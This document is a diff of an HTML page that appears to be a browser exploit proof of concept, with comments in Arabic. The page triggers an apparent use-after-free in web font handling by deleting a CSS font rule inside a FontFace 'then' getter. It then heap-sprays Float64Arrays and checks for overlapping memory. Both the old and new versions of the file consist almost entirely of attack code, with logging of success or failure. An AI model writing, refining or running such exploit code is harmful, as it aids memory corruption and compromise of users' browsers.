@@ -1,50 +1,72 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <style>body { background: #000; color: #0f0; font-family: monospace; }</style>
-    <style id="fontStyle">@font-face { font-family: 'TargetFont'; src: url(nonexistent.woff); }</style>
+    <style id="fontStyle">
+        @font-face { font-family: 'TargetFont'; src: url(nonexistent.woff); }
+    </style>
 </head>
 <body>
-    <div id="debug">System Ready...</div>
+    <div id="status" style="color: #0f0; font-family: monospace;">System Initialized...</div>
 
-<script>
-<script>
-    let spray = [];
-    let pressure = [];
+    <script>
+        const status = document.getElementById('status');
+        let spray = [];
+        let pressure = [];
 
-    // 1. الضغط الذاكري: استنزاف الذاكرة المتاحة
-    function createPressure() {
-        for (let i = 0; i < 5000; i++) {
-            pressure.push(new Array(64).fill(0x12345678));
-        }
-    }
+        function log(msg) { status.innerText += "\n[+] " + msg; }
 
-    function trigger() {
-        createPressure(); // ضغط الذاكرة
-        
-        let font = new FontFace('TargetFont', 'local(Arial)', { unicodeRange: 'U+0041' });
-        document.fonts.add(font);
-
-        Object.defineProperty(FontFace.prototype, 'then', {
-            get() {
-                // الحذف
-                document.getElementById('fontStyle').sheet.deleteRule(0);
-                
-                // 2. الـ Spray المكثف في الفراغ
-                for (let i = 0; i < 2000; i++) {
-                    // استخدام JSArray (Butterfly target)
-                    spray.push(new Array(32).fill(0x41414141));
-                }
-                return undefined;
+        // تقنية Spray متطورة باستخدام Float64Array للتحكم في الـ Butterfly
+        function performHeapSpray() {
+            for (let i = 0; i < 2000; i++) {
+                // مصفوفة من النوع Float64 تضمن وضع البيانات في هيكل الـ ArrayBuffer (داخل الـ IsoHeap)
+                let arr = new Float64Array(32);
+                arr[0] = 1.1; // القيمة المرجعية للتحقق
+                spray.push(arr);
             }
-        });
-        font.load();
-    }
+        }
 
-    setTimeout(trigger, 1000);
-</script>
+        function triggerUAF() {
+            log("Triggering UAF...");
+            
+            // تهيئة الضغط الذاكري لإجبار الـ Allocator على إعادة استخدام المكان
+            for (let i = 0; i < 1000; i++) pressure.push(new Array(64));
 
-</script>
+            let font = new FontFace('TargetFont', 'local(Arial)', { unicodeRange: 'U+0041' });
+            document.fonts.add(font);
 
+            Object.defineProperty(FontFace.prototype, 'then', {
+                get() {
+                    // 1. الحذف (تحرير المساحة)
+                    document.getElementById('fontStyle').sheet.deleteRule(0);
+                    
+                    // 2. الملء الفوري (استبدال الـ CSSFontFace بكائننا)
+                    performHeapSpray();
+                    
+                    return undefined;
+                }
+            });
+
+            font.load();
+        }
+
+        // اختبار التداخل (Memory Overlap Check)
+        function verify() {
+            let found = false;
+            for (let i = 0; i < spray.length; i++) {
+                // إذا تغيرت القيمة، فهذا يعني أن الكائن قد تم استبداله في الذاكرة
+                if (spray[i][0] !== 1.1) {
+                    log("SUCCESS: Memory overlap at index " + i);
+                    found = true;
+                    break;
+                }
+            }
+            if (!found) log("Status: Buffers intact. (Try adjusting spray size)");
+        }
+
+        window.onload = () => {
+            setTimeout(triggerUAF, 1000);
+            setTimeout(verify, 2000);
+        };
+    </script>
 </body>
 </html>
